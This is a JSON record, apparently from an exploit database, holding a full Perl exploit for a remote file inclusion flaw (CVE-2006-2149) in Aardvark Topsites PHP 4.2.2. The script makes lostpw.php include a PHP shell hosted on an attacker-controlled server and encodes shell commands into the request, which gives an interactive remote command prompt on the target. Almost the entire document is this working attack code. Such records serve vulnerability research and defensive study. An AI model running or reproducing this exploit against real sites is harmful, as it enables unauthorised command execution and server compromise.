{
  "id": "1732",
  "title": "Aardvark Topsites PHP 4.2.2 - &#039;lostpw.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-2149",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n#\r\n# Aardvark Topsites PHP <=4.2.2 Remote Command Execution Exploit\r\n#\r\n# Copyright (c) 2006 cijfer <cijfer@netti!fi>\r\n# All rights reserved.\r\n#\r\n# never ctrl+c again.\r\n# cijfer$ http://target.com/dir\r\n# host changed to 'http://target.com/dir'\r\n# cijfer$ \r\n#\r\n# to set your PHP shell location:\r\n# cijfer$ shell=http://my.shell.fi/phpshell.gif?&cmd=\r\n# php shell set to 'http://my.shell.fi/phpshell.gif?&cmd='\r\n# cijfer$\r\n#\r\n# $Id: cijfer-atpxpl.pl,v 0.1 2006/04/30 02:11:00 cijfer Exp $\r\n\r\nuse strict;\r\nuse LWP::UserAgent;\r\nuse URI::Escape;\r\nuse Getopt::Long;\r\nuse Term::ANSIColor;\r\n\r\nmy($command,$verbose,$proxy,$shell,$host,$res);\r\n\r\n$res = GetOptions(\"host=s\" => \\$host, \"proxy=s\" => \\$proxy, \"verbose+\" => \\$verbose);\r\n&usage unless $host;\r\n\r\nwhile()\r\n{\r\n\tprint color(\"green\"), \"cijfer\\# \", color(\"reset\");\r\n\tchomp($command = <STDIN>);\r\n\texit unless $command;\r\n\tif($command =~ m/^http:\\/\\/(.*)/g)\r\n\t{\r\n\t\t$host=\"http://\".$1;\r\n\t\tprint \"host changed to '\";\r\n\t\tprint color(\"bold\"), $host.\"'\\n\", color(\"reset\");\r\n\t}\r\n\telsif($command =~ m/^shell=http:\\/\\/(.*)/g)\r\n\t{\r\n\t\t$shell=\"http://\".$1;\r\n\t\tprint \"php shell set to '\";\r\n\t\tprint color(\"bold\"), $shell.\"'\\n\", color(\"reset\");\r\n\t}\r\n\telse\r\n\t{\r\n\t\t&exploit($command,$host);\r\n\t}\r\n}\r\n\r\nsub usage\r\n{\r\n\tprint \"Aardvark Topsites PHP <=4.2.2 Remote Command Execution Exploit\\n\";\r\n\tprint \"usage: $0 -hpv\\n\\n\";\r\n\tprint \"  -h, --host\\t\\tfull address of target (ex. http://www.website.com/directory)\\n\";\r\n\tprint \"  -p, --proxy\\t\\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\\n\";\r\n\tprint \"  -v, --verbose\\t\\tverbose mode (debug)\\n\\n\";\r\n\texit;\r\n}\r\n\r\nsub exploit\r\n{\r\n\tmy($command,$host) = @_;\r\n\tmy($string,$execut,$recv,$sent,$out,$cij,@cij);\r\n\r\n\t$cij=LWP::UserAgent->new() or die;\r\n\t$cij->agent(\"Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:2.0) Gecko/20060101\");\r\n\t$cij->proxy(\"http\", \"http://\".$proxy.\"/\") unless !$proxy;\r\n\r\n\t$string  = \"%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F%3B%20\";\r\n\t$string .= uri_escape(shift);\r\n\t$string .= \"%3B%20%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F\";\r\n\r\n\t$out=$cij->get($host.\"/sources/lostpw.php?FORM[set]=1&FORM[session_id]=1&CONFIG[path]=\".$shell.$string);\r\n\r\n\tif($out->is_success)\r\n\t{\r\n\t\t@cij=split(\"_cijfer_\",$out->content);\r\n\t\tprint substr(@cij[1],1);\r\n\t}\r\n\r\n\tif($verbose)\r\n\t{\r\n\t\t$recv=length $out->content;\r\n\t\tprint \"Total received bytes: \".$recv.\"\\n\";\r\n\t\t$sent=length $command;\r\n\t\tprint \"Total sent bytes: \".$sent.\"\\n\";\r\n\t}\r\n}\r\n\r\n# milw0rm.com [2006-04-30]",
  "url": "https://www.exploit-db.com/exploits/1732"
}